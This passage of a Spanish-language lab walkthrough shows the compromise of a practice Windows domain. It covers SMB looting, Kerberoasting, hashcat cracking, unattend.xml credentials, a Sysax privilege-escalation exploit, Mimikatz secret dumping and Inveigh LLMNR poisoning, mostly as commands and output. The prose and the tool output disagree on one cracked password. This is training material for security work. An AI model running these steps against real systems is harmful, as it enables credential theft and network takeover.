|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:34:06 2022
  ..                                  D        0  Wed Jun  1 14:34:06 2022
  Accounting                          D        0  Wed Jun  1 14:34:08 2022
  Executives                          D        0  Wed Jun  1 14:34:04 2022
  Finance                             D        0  Wed Jun  1 14:34:00 2022
  HR                                  D        0  Wed Jun  1 14:33:48 2022
  IT                                  D        0  Wed Jun  1 14:33:42 2022
  Marketing                           D        0  Wed Jun  1 14:33:56 2022
  R&D                                 D        0  Wed Jun  1 14:33:52 2022

		10328063 blocks of size 4096. 8177952 blocks available
```

Luego podemos navegar hasta el recurso compartido `IT/Private/Development`. Dentro encontramos un script de backup que nos vamos a descargar:

```bash
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

		10328063 blocks of size 4096. 8177952 blocks available
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Private\Development\SQL

smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
```

Al leer el archivo encontramos las credenciales de `backupadm`:

```shell-session
afsh4ck@kali$ cat SQL\ Express\ Backup.ps1 
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"
```

### Pregunta 2

> Realiza un ataque de Kerberoasting y recupera los tickets TGS de todas las cuentas configuradas como SPN. Descifra el TGS del usuario de `backupjob` y envía la contraseña en texto plano como respuesta.

#### Enumeración de usuarios Kerberos

En la powershell que tenemos abierta con PowerView ejecutamos:

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN | Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Vamos a exportarlos a un archivo CSV para procesarlos sin conexión.

```powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

```powershell
PS C:\DotNetNuke\Portals\0> dir

    Directory: C:\DotNetNuke\Portals\0

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022   1:49 PM                Images
d-----         6/1/2022   1:49 PM                Templates
d-----         6/1/2022   1:51 PM                Users
-a----         6/1/2022   1:49 PM           9569 home.css
-a----        4/23/2025  10:41 AM          30695 ilfreight_spns.csv
-a----        4/22/2025  12:45 PM         770280 PowerView.ps1
-a----         4/2/2025   9:20 PM         491520 Snaffler.exe
-a----        4/23/2025  10:11 AM          22420 snaffler.log
```

Lo más sencillo es leer el CSV con `type` y copiarlo a nuestro Kali Linux. También podemos copiarlo directamente a nuestro Kali con:

```powershell
PS C:\DotNetNuke\Portals\0> copy .\ilfreight_spns.csv \\Tsclient\Home
```

#### Cracking con Hashcat

Debemos limpiar el archivo y dejar solo los hashes kerberos para poder crackearlo con Hashcat:

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>afsh4ck@kali$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
</strong>
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$a981aa50080ffd043d2ba2a6497aa64b$2874e2045552097f63332abd495eb365b72064b0b530925db4cc03a66eedaf7d7068ab4fb554d1d892c818b301288f7fadc7a0be29733d7187635d441c9d84707bdc04e2af83930f931901ee852ba7f2c13aac99c7094e22396a53c992384f152dcfe021367b6845bb2f903b03fca7ee3d824de6df6c93e725fed5f14d3e949f1d396b6269a1336cedd223bc245ce91291e7b8fa346002bb05c14157681&#x3C;----SNIP---->:lucky7
</code></pre>

Tenemos la contraseña del usuario `backupjob`!&#x20;

### Pregunta 3

> Escala privilegios en el host `MS01` y envía el contenido del archivo `flag.txt` en el Escritorio del administrador.

El host `172.16.8.50`, o `MS01` es el único que queda en el que no hemos podido entrar aparte del controlador de dominio, así que vamos a intentarlo usando `evil-winrm` y las credenciales del usuario `backupadm`.

#### Escaneo de puertos

```shell-session
afsh4ck@kali$ proxychains nmap -sT -Pn -p 5985 172.16.8.50

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 20:10 CEST
Nmap scan report for 172.16.8.50
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds
```

#### Conexión con EvilWinrm

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ proxychains evil-winrm -i 172.16.8.50 -u backupadm
</strong>
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK

*Evil-WinRM* PS C:\Users\backupadm\Documents>
</code></pre>

#### Búsqueda de archivo unattend.xml

```powershell
*Evil-WinRM* PS C:\Users\backupadm> Get-ChildItem -Path C:\ -Recurse -Include Unattend.xml, Autounattend.xml -ErrorAction SilentlyContinue -Force |
Select-Object FullName, Length, LastWriteTime
 
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.50:5985  ...  OK

FullName                        Length LastWriteTime
--------                        ------ -------------
C:\panther\unattend.xml           6995 6/1/2022 2:17:25 PM
C:\Windows\Panther\unattend.xml   2357 6/1/2022 12:11:28 PM
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                <OOBE>
                    <HideEULAPage>true</HideEULAPage>
                    <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                    <NetworkLocation>Work</NetworkLocation>
                    <ProtectYourPC>1</ProtectYourPC>
                </OOBE>
                <AutoLogon>
                    <Password>
                        <Value>Sys26Admin</Value>
                        <PlainText>true</PlainText>
                    </Password>
                    <Enabled>true</Enabled>
                    <LogonCount>1</LogonCount>
                    <Username>ilfserveradm</Username>
                </AutoLogon>
```

Encontramos las credenciales del usuario `ilfserveradm:Sys26Admin`. Este usuario pertenece al grupo Remote Desktop Users, por lo que vamos a conectarnos para ver que nos encontramos:

#### Configuración de pivoting

Especificamos el host `172.16.8.50`:

```bash
ssh -i dmz01_key -L 13389:172.16.8.50:3389 root@10.129.229.147
```

```
xfreerdp /v:127.0.0.1:13389 /u:ilfserveradm /p:Sys26Admin /drive:home,"/home/kali/Escritorio/hack-tools/Windows"
```

En este host si tenemos interfaz gráfica:

<figure><img src="/files/SRED7WrnnnnBX0pbCbYq" alt=""><figcaption></figcaption></figure>

En el directorio C:/ nos encontramos un archivo de Keepass `Inlanefreight.kdbx` interesante, pero no está instalado Keepass, por lo que no merece la pena detenerse aquí, aunque transfiriendo este archivo a Kali y usando `keepass2john` para convertirlo a un formato legible por john, descubrimos la contraseña Password1, que nos puede servir para técnicas de Password Spraying:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ keepass2john Inlanefreight.kdbx > keepass.hash
</strong></code></pre>

```shell-session
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (Inlanefreight) 
```

#### Enumeración de programas instalados

```powershell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ,
                 HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
Where-Object { $_.DisplayName } | Sort-Object DisplayName
```

```powershell
PS C:\Users\ilfserveradm> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ,
>>                  HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
>> Select-Object DisplayName, DisplayVersion, InstallDate |
>> Where-Object { $_.DisplayName } | Sort-Object DisplayName
>>

DisplayName                                                        DisplayVersion  InstallDate
-----------                                                        --------------  -----------
Apache Tomcat 10.0 Tomcat10 (remove only)                          10.0.21
Java 8 Update 333 (64-bit)                                         8.0.3330.2      20220601
Java Auto Updater                                                  2.8.333.2       20220601
Java(TM) SE Development Kit 18.0.1.1 (64-bit)                      18.0.1.1        20220601
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913 14.28.29913.0
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913 14.28.29913.0
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913     14.28.29913     20220622
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913        14.28.29913     20220622
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913     14.28.29913     20220622
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913        14.28.29913     20220622
Mozilla Firefox (x64 en-US)                                        100.0.1
Mozilla Maintenance Service                                        100.0.1
Sysax FTP Automation 6                                             6.1.0           20220601
VMware Tools                                                       11.3.5.18557794 20220622
```

Encontramos un programa que nos llama la atención: `Sysax FTP Automation 6 versión 6.1.0`. Rápidamente encontramos un exploit válido para escalar privilegios:

{% embed url="<https://www.exploit-db.com/exploits/50834>" %}

Solo tenemos que seguir estos pasos:

Primero, creamos un archivo llamado `pwn.bat` en `C:\Users\ilfserveradm\Documents` que contenga la línea `net localgroup administrators ilfserveradm /add` para agregar a nuestro usuario al grupo de administradores locales (en ocasiones, necesitaremos corregirlo y anotarlo en los apéndices de nuestro informe). A continuación, podemos realizar los siguientes pasos:

* Abrimos `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`

<figure><img src="/files/G6Qfl1OAGYqxXCHBRj9v" alt=""><figcaption></figcaption></figure>

* Seleccionamos `Setup Scheduled/Triggered Tasks`
* Add Task (Triggered)

<figure><img src="/files/dCKJ7Mv8BYynLIpkvwS7" alt=""><figcaption></figcaption></figure>

* Folder to monitor `C:\Users\ilfserveradm\Documents`
* Activamos `Run task if a file is added to the monitor folder or subfolder(s)`

<figure><img src="/files/O81ps0Dkb0Kl3N3VdwVz" alt=""><figcaption></figcaption></figure>

* Elegimos `Run any other Program` y elegimos `C:\Users\ilfserveradm\Documents\pwn.bat`

<figure><img src="/files/ukXwgWMtiHRirkzecTGN" alt=""><figcaption></figcaption></figure>

* Desmarcamos `Login as the following user to run task`

<figure><img src="/files/OzHW9lrmuF0Eu1GrP8Q1" alt=""><figcaption></figcaption></figure>

* Hacemos clic en `Finish` y luego `Save`

<figure><img src="/files/qHMUkdyIfss2Ie9BCPF0" alt=""><figcaption></figcaption></figure>

#### Comprobar administradores locales

Finalmente, para activar la tarea, creamos un nuevo archivo .txt en el directorio `C:\Users\ilfserveradm\Documents`. Podemos comprobar que el usuario `ilfserveradm` se ha añadido al grupo `Administrators`.

```cmd-session
C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

#### Acceso a la flag

```powershell
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM             32 flag.txt
-a----         6/1/2022   2:22 PM           3017 Sysax FTP Automation.lnk


PS C:\Users\Administrator\Desktop> type .\flag.txt
33a9d46de4015e7b3b0a**************
```

### Pregunta 4

> Obtén el hash de la contraseña NTLMv2 del usuario `mpalledorous` y crackéalo para revelar el valor en texto plano. Envíe la contraseña del usuario como respuesta.

Ahora que somos administradores locales vamos a usar Mimikatz para elevar a un token `NT AUTHORITY\SYSTEM` y volcar los LSA Secrets.

Abrimos un CMD como administrador local, poniendo `.\` delante del nombre del usuario, ya que de otra manera se autentica contra el dominio y no contra la máquina actual:

<figure><img src="/files/3La4cEeAhxfpUlbN3yJ8" alt=""><figcaption></figcaption></figure>

```
c:\Users\ilfserveradm\Documents>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

560     {0;000003e7} 1 D 36292          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;002c866c} 2 F 2940480     ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2994215     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

```
mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/hex : fe 20 40 e1 0a 47 dd bd 5a 2e 03 e0 78 5e a1 8b 35 04 60 97 36 9f 4e 7e f8 e1 7f 6d c8 20 ba 06 9f 57 43 4a 6f 54 1b cf 25 98 97 25 95 15 d9 6b 4a d7 56 0f 67 dd aa 7c 62 0c 06 af c7 59 b5 f4 30 42 f2 9b 51 9f 42 e4 ff 01 b7 c0 88 58 27 0b 35 da 5d cc 6f 80 46 07 4f d1 52 9f 33 a7 98 70 67 ab 33 12 5c 6a e1 eb cd 77 7c 0d e9 b0 db 96 3b 3b 30 ca ae 43 00 3f b6 cd 36 5b f7 22 5c 9e a8 97 9f fd 5d 21 f8 62 9b 27 d6 dd ec fb 51 91 dc 53 60 42 98 8c 38 e0 88 2a a2 ff 18 2a 5d 72 b0 31 8b d0 87 e2 7a 94 6a 2f 7d 57 59 50 07 61 93 24 60 0d 1c 23 a2 67 40 6c bf 7b 34 69 ba 40 b5 1f 12 33 f6 dc 3d 8b 6c 1d 1d af 10 d3 a6 bc 67 04 51 da 9d 9c 53 1c 19 1a ad c2 47 38 c0 2b ff 6a 8c e8 ad 90 c9 81 df b0 9c d1 34 f5 64 f9
    NTLM:094bc6d0ed8ed60f13299d8313c4b81f
    SHA1:adec97cf6a3c45cca7fee96dbef00bf67e2dbb4d
old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!
```

Encontramos una contraseña establecida, pero no un nombre de usuario asociado. Parece ser una cuenta configurada con inicio de sesión automático, por lo que podemos consultar el Registro para encontrar el nombre de usuario.

```powershell
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

Ahora tenemos un nuevo par de credenciales: `mssqladm:DBAilfreight1!`. Explotaremos este usuario en la siguiente sección.

#### LLMNR Poisoning con Inveight

{% code overflow="wrap" %}

```powershell
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-06-22T15:03:32
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] Spoofer IP Address = 172.16.8.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\ilfserveradm\Documents
WARNING: [!] Run Stop-Inveigh to stop
[+] [2025-04-23T14:41:14] TCP(445) SYN packet detected from 172.16.8.20:50233
[+] [2025-04-23T14:41:14] SMB(445) negotiation request detected from 172.16.8.20:50233
[+] [2025-04-23T14:41:14] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2025-04-23T14:41:14] SMB(445) NTLM challenge 0A2EE1DE83C6E31F sent to 172.16.8.20:50233
[+] [2025-04-23T14:41:14] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):50233:
mpalledorous::ACADEMY-AEN-DEV:0A2EE1DE83C6E31F:D8D940EE099FF093E325C8C84C3FF8F2:01010000000000007EECAEAC87B4DB01A1C9C5DB6C216A610000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008007EECAEAC87B4DB010600040002000000080030003000000000000000000000000020000028328ADCACA7B202CB4B77343BDDDFAF85F72767F4C4EAAAA46C04E081B17F260A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
```

{% endcode %}

#### Cracking de Hash NTLMv2

{% code overflow="wrap" %}

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force 

hashcat (v6.2.6) starting

MPALLEDOROUS::ACADEMY-AEN-DEV:0a2ee1de83c6e31f:d8d940ee099ff093e325c8c84c3ff8f2:01010000000000007eecaeac87b4db01a1c9c5db6c216a610000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008007eecaeac87b4db010600040002000000080030003000000000000000000000000020000028328adcaca7b202cb4b77343bdddfaf85f72767f4c4eaaaa46c04e081b17f260a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000:1squints2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MPALLEDOROUS::ACADEMY-AEN-DEV:0a2ee1de83c6e31f:d8d9...000000
Time.Started.....: Wed Apr 23 21:48:50 2025, (15 secs)
Time.Estimated...: Wed Apr 23 21:49:05 2025, (0 secs)
```

{% endcode %}

Lo tenemos!
